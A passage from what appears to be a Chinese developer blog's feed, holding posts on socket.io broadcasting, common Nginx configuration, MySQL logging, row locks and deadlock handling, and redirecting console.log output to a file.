class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>创建的服务运行在本地的 <code>3000</code> 端口上，打开浏览器，输入<code>http://localhost:3000</code>进行访问。 </p><h2 id="使用事件"><a href="#使用事件" class="headerlink" title="使用事件"></a>使用事件</h2><p><code>socket.io</code> 的核心理念就是允许发送、接收任意事件和任意数据。任意能被编码为 JSON 的对象都可以用于传输。二进制数据 也是支持的。</p><p>在上面的代码中，我们已经创建了一个服务端的<code>socket.io</code>对象，如果想要能正常通讯，还需要在客户端同样也创建一个<code>socket.io</code>对象。这个脚本由服务端的<code>/socket.io/socket.io.js</code> 提供。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   </span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>在客户端中建立 <code>socket.io</code> 连接。</p><p>在服务端中添加以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 只有有客户端连接，就会触发这个事件</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   console.log(&#39;A user connected&#39;);</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; 只有有客户端断开连接，就会触发这个事件</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      console.log(&#39;A user disconnected&#39;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>现在再次访问<code>http://localhost:3000</code>，不仅可以在浏览器中看见<code>hello world</code>，如果刷新浏览器，还能在控制台中看见以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A user connected</span><br><span class="line">A user disconnected</span><br><span class="line">A user connected</span><br></pre></td></tr></table></figure><p>在上面的案例中，我们使用了<code>socket.io</code>的<code>connection</code>和<code>disconnect</code>事件，<code>socket.io</code>还有很多其中事件。 </p><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>在服务端中有以下是保留字：</p><ul><li>Connect</li><li>Message</li><li>Disconnect</li><li>Reconnect</li><li>Ping</li><li>Join and</li><li>Leave</li></ul><p>在客户端中以下是保留字：</p><ul><li>Connect</li><li>Connect_error</li><li>Connect_timeout</li><li>Reconnect, etc</li></ul><h3 id="常用API"><a href="#常用API" class="headerlink" title="常用API"></a>常用API</h3><p>客户端 提供的一些用于处理错误/异常的API。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Connect − When the client successfully connects.</span><br><span class="line"></span><br><span class="line">Connecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Disconnect − When the client is disconnected.</span><br><span class="line"></span><br><span class="line">Connect_failed − When the connection to the server fails.</span><br><span class="line"></span><br><span class="line">Error − An error event is sent from the server.</span><br><span class="line"></span><br><span class="line">Message − When the server sends a message using the send function.</span><br><span class="line"></span><br><span class="line">Reconnect − When reconnection to the server is successful.</span><br><span class="line"></span><br><span class="line">Reconnecting − When the client is in the process of connecting.</span><br><span class="line"></span><br><span class="line">Reconnect_failed − When the reconnection attempt fails.</span><br></pre></td></tr></table></figure><h3 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h3><p>广播意味着向所有连接的客户端发送消息。</p><p>要向所有客户端广播事件，我们可以使用<code>io.sockets.emit</code>方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  ...</span><br><span class="line"></span><br><span class="line">var clients &#x3D; 0;</span><br><span class="line">io.on(&#39;connection&#39;, function(socket) &#123;</span><br><span class="line">   clients++;</span><br><span class="line">   io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   socket.on(&#39;disconnect&#39;, function () &#123;</span><br><span class="line">      clients--;</span><br><span class="line">      io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;);</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">  </span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>广播在<code>socket.io</code>中应用的非常多，有广播就意味着有接收。需要在客户端中处理广播事件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      var socket &#x3D; io();</span><br><span class="line">      socket.on(&#39;broadcast&#39;,function(data) &#123;</span><br><span class="line">         document.body.innerHTML &#x3D; &#39;&#39;;</span><br><span class="line">         document.write(data.description);</span><br><span class="line">      &#125;);</span><br><span class="line">   &lt;&#x2F;script&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>可以尝试打开多个浏览器，输入<code>http://localhost:3000</code>，可能会得到以下结果：</p><p><img src="https://www.tutorialspoint.com/socket.io/images/broadcast_to_all.jpg" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.tutorialspoint.com/socket.io/index.htm" target="_blank" rel="noopener">Socket.io Tutorial</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
          <category> Socket.io </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Socket.io </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx 常见配置</title>
      <link href="/nginx-common-configuration/"/>
      <url>/nginx-common-configuration/</url>
      
        <content type="html"><![CDATA[<p>最近接触Nginx 配置比较多，所以整理一下，方便后面回顾。</p><a id="more"></a><h2 id="多站点配置"><a href="#多站点配置" class="headerlink" title="多站点配置"></a>多站点配置</h2><p>如果一台服务器，需要配置多套站点，推荐使用 <code>IP + 端口</code>配置站点，然后使用反向代理指向端口。</p><p>站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       40001;</span><br><span class="line">    </span><br><span class="line">    location ~ \.php &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多站点配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 站点1 </span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 站点2</span><br><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理其实已经在上面的配置中出现过了，多站点配置的原理就是利用反向代理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  server_name  yoursite2.com;</span><br><span class="line">listen 80;</span><br><span class="line"></span><br><span class="line">  location &#x2F; &#123;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">  index  index.html index.htm index.jsp index.js;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SSL-配置"><a href="#SSL-配置" class="headerlink" title="SSL 配置"></a>SSL 配置</h2><p>申请好证书之后，将其放在服务器上，然后编辑Nginx 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name  yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem;  &#x2F;&#x2F; 证书所在路径</span><br><span class="line">    ssl_certificate_key ssl_0123cp_net&#x2F;private.key;  &#x2F;&#x2F; 证书对应的私钥所在路径</span><br><span class="line">  </span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">        proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001;</span><br><span class="line">        index  index.html index.htm index.jsp index.js;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="http重定向"><a href="#http重定向" class="headerlink" title="http重定向"></a>http重定向</h2><p>配置好 <code>https</code>之后，还需要做一件事，才能保证 <code>https</code>能够正常访问。</p><p>因为访问任何一个网站时，默认使用的是<code>http</code>协议，所以需要在<code>Web Server</code>中配置<code>http</code> 自动跳转 <code>https</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    server_name yoursite.com;</span><br><span class="line">  </span><br><span class="line">    listen 80;</span><br><span class="line">    rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 开启 Mysql 日志记录</title>
      <link href="/mac-open-mysql-logging/"/>
      <url>/mac-open-mysql-logging/</url>
      
        <content type="html"><![CDATA[<p>有时候可能会想在本地开启Mysql 的日志记录，看看具体都执行了哪些SQL，其实非常简单。</p><a id="more"></a><ol><li>进入Mysql 命令行</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -hlocalhost -uroot -p</span><br></pre></td></tr></table></figure><ol start="2"><li>全局开启普通日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;on;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看Mysql 日志文件所在目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;general_log_file&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719172134.png" alt=""></p><ol start="4"><li>实时查看日志记录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f &#x2F;your_mysql_log_file_path</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 行锁原因分析</title>
      <link href="/analysis-of-the-causes-of-mysql-row-lock/"/>
      <url>/analysis-of-the-causes-of-mysql-row-lock/</url>
      
        <content type="html"><![CDATA[<p>这篇文章来浅谈一下什么是Mysql 行锁，以及产生行锁的原因。</p><a id="more"></a><h1 id="锁的分类"><a href="#锁的分类" class="headerlink" title="锁的分类"></a>锁的分类</h1><p>MySQL有三种锁的级别：页级、表级、行级。</p><ul><li>表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高,并发度最低。</li><li>行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低,并发度也最高。</li><li>页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般</li></ul><p>因为这篇笔记只介绍Mysql 行锁，所以这里不对其他类型的锁做介绍了。</p><h2 id="行锁"><a href="#行锁" class="headerlink" title="行锁"></a>行锁</h2><p>InnoDB实现了两种类型的行锁:</p><ul><li>共享锁【S锁】又称读锁，若事务T对数据对象A加上S锁，则事务T可以读A但不能修改A，其他事务只能再对A加S锁，而不能加X锁，直到T释放A上的S锁。这保证了其他事务可以读A，但在T释放A上的S锁之前不能对A做任何修改。</li><li>排他锁【X锁】又称写锁。若事务T对数据对象A加上X锁，事务T可以读A也可以修改A，其他事务不能再对A加任何锁，直到T释放A上的锁。这保证了其他事务在T释放A上的锁之前不能再读取和修改A。</li></ul><blockquote><p>所谓X锁,是事务T对数据A加上X锁时,只允许事务T读取和修改数据A; 所谓S锁,是事务T对数据A加上S锁时,其他事务只能再对数据A加S锁,而不能加X锁,直到T释放A上的S锁</p></blockquote><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><ol><li>首先创建一个 <code>InnoDB</code>类型的数据表，SQL 如下：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;gap&#96; (</span><br><span class="line">  &#96;id&#96; int(11) DEFAULT NULL,</span><br><span class="line">  KEY &#96;ind_gap_id&#96; (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br></pre></td></tr></table></figure><ol start="2"><li>创建会话1，开启事务A并执行update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 30 where id &#x3D; 33;</span><br></pre></td></tr></table></figure><ol start="3"><li>创建会话2，开启事务B并执行另一个update 语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start transaction;</span><br><span class="line">update gap set id &#x3D; 22 where id &#x3D; 20;</span><br></pre></td></tr></table></figure><p>在会话2中 插入<code>20 &gt; id &lt; 39</code>范围外的值时 可以执行成功,而当要插入 <code>[20,39)</code>范围内的值时 会遇到gap lock 。</p><ol start="4"><li>用会话1 查看当前正在进行中的事务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure></li></ol><p>不会意外，能看到下面两条记录：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p>这是因为执行update 语句之后，mysql 会执行索引扫描并在该表上施加一个 <code>next-key lock</code> ,向左扫描到20,向右扫描到39 ,锁定区间左闭右开,所以lock的范围是 <code>[20,39)</code>。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>根据实际情况的不同，有不同的方式可以避免死锁，这里介绍常用的几种：</p><ol><li>改变数据库操作逻辑，尽量避免在不同的事务中，对同一条记录进行更改。</li><li>如果不同程序会并发存取多个表，尽量约定以相同的顺序访问表，可以大大降低死锁机会。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/rainy-shurun/p/5166163.html" target="_blank" rel="noopener">Mysql 死锁原因分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 查看死锁和解除死锁</title>
      <link href="/mysql-view-deadlock-and-release-deadlock/"/>
      <url>/mysql-view-deadlock-and-release-deadlock/</url>
      
        <content type="html"><![CDATA[<p>前段时间遇到了一个Mysql 死锁相关的问题，整理一下。</p><a id="more"></a><blockquote><p>问题描述：Mysql 的修改语句似乎都没有生效，同时使用Mysql GUI 工具编辑字段的值时会弹出异常。</p></blockquote><p><img src="https://i.loli.net/2020/06/28/3dXRhKHQWMlearC.png" alt="image.png"></p><h3 id="什么是死锁"><a href="#什么是死锁" class="headerlink" title="什么是死锁"></a>什么是死锁</h3><p>在解决Mysql 死锁的问题之前，还是先来了解一下什么是死锁。</p><p>死锁是指两个或两个以上的进程在执行过程中,因争夺资源而造成的一种互相等待的现象,若无外力作用,它们都将无法推进下去.此时称系统处于死锁状态或系统产生了死锁,这些永远在互相等的进程称为死锁进程。</p><h3 id="死锁的表现"><a href="#死锁的表现" class="headerlink" title="死锁的表现"></a>死锁的表现</h3><p>死锁的具体表现有两种：</p><ol><li>Mysql 增改语句无法正常生效</li><li>使用Mysql GUI 工具编辑字段的值时，会出现异常。</li></ol><h3 id="如何避免死锁"><a href="#如何避免死锁" class="headerlink" title="如何避免死锁"></a>如何避免死锁</h3><p>阻止死锁的途径就是避免满足死锁条件的情况发生，为此我们在开发的过程中需要遵循如下原则：</p><p>1.尽量避免并发的执行涉及到修改数据的语句。</p><p>2.要求每一个事务一次就将所有要使用到的数据全部加锁，否则就不允许执行。</p><p>3.预先规定一个加锁顺序，所有的事务都必须按照这个顺序对数据执行封锁。如不同的过程在事务内部对对象的更新执行顺序应尽量保证一致。</p><h3 id="查看死锁"><a href="#查看死锁" class="headerlink" title="查看死锁"></a>查看死锁</h3><p>Mysql 查询是否存在锁表有多种方式，这里只介绍一种最常用的。</p><h4 id="1-查看正在进行中的事务"><a href="#1-查看正在进行中的事务" class="headerlink" title="1. 查看正在进行中的事务"></a>1. 查看正在进行中的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM information_schema.INNODB_TRX</span><br></pre></td></tr></table></figure><p>可以看到 进程id为3175 的事务在锁住了，而另一个id为3173的事务正在执行，但是没有提交事务。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155146.png" alt=""></p><h4 id="2-查看正在锁的事务"><a href="#2-查看正在锁的事务" class="headerlink" title="2. 查看正在锁的事务"></a>2. 查看正在锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCKS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163402.png" alt=""></p><h4 id="3-查看等待锁的事务"><a href="#3-查看等待锁的事务" class="headerlink" title="3. 查看等待锁的事务"></a>3. 查看等待锁的事务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM INFORMATION_SCHEMA.INNODB_LOCK_WAITS;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719155801.png" alt=""></p><h4 id="4-查询是否锁表"><a href="#4-查询是否锁表" class="headerlink" title="4. 查询是否锁表"></a>4. 查询是否锁表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719163422.png" alt=""></p><h4 id="5-查看最近死锁的日志"><a href="#5-查看最近死锁的日志" class="headerlink" title="5. 查看最近死锁的日志"></a>5. 查看最近死锁的日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engine innodb status</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200719170929.png" alt=""></p><p>在发生死锁时，这几种方式都可以查询到和当前死锁相关的信息。</p><h3 id="解除死锁"><a href="#解除死锁" class="headerlink" title="解除死锁"></a>解除死锁</h3><p>如果需要解除死锁，有一种最简单粗暴的方式，那就是找到进程id之后，直接干掉。</p><p>查看当前正在进行中的进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show processlist</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 也可以使用</span><br><span class="line">SELECT * FROM information_schema.INNODB_TRX;</span><br></pre></td></tr></table></figure><p>上面两个命令找出来的进程id 是同一个。</p><p>杀掉进程对应的进程 id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill id</span><br></pre></td></tr></table></figure><p>验证（kill后再看是否还有锁）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW OPEN TABLES where In_use &gt; 0;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.cnblogs.com/duanxz/p/4394641.html" target="_blank" rel="noopener">Mysql 查看表和解锁表</a></li><li><a href="https://blog.csdn.net/LJFPHP/article/details/80599352" target="_blank" rel="noopener">Mysql 死锁是什么？</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何把 Console.log 的标准输出记录到文件</title>
      <link href="/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/"/>
      <url>/how-to-put-console-log-the-standard-output-of-is-recorded-to-a-file/</url>
      
        <content type="html"><![CDATA[<p>最近遇到了这样一个需求，在不改动之前的任何一行代码的前提下，如何把<code>console.log</code>的标准输出全部记录到文件中呢？</p><a id="more"></a><p>我是没有选择那些大名鼎鼎的日志模块，如：</p><ul><li><a href="https://github.com/winstonjs/winston" target="_blank" rel="noopener">winston</a> - A logger for just about everything.</li><li><a href="https://github.com/log4js-node/log4js-node" target="_blank" rel="noopener">log4js</a> - A port of log4js to node.js</li></ul><p>因为我的需求够简单，只需要能把日志记录到文件就行，所以使用了下面这种最简单的方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var log_file &#x3D; fs.createWriteStream(path.resolve(__dirname, &quot;.pm2&quot;) + &#39;&#x2F;debug.log&#39;, &#123;flags : &#39;w&#39;&#125;);</span><br><span class="line">var log_stdout &#x3D; process.stdout;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 重载console.log 函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">console.log &#x3D; function() &#123;</span><br><span class="line">    var res &#x3D; &quot;&quot;,</span><br><span class="line">    len &#x3D; arguments.length;</span><br><span class="line">    for(var i&#x3D;0; i&lt;len; i++)&#123;</span><br><span class="line">        res +&#x3D; arguments[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log_file.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">    log_stdout.write(util.format(res) + &#39;\n&#39;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/8393636/node-log-in-a-file-instead-of-the-console" target="_blank" rel="noopener">Node: log in a file instead of the console</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 一些经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Firefox “已阻止载入混合活动内容”</title>
      <link href="/resolve-firefox-has-blocked-loading-of-mixed-active-content/"/>
      <url>/resolve-firefox-has-blocked-loading-of-mixed-active-content/</url>
      
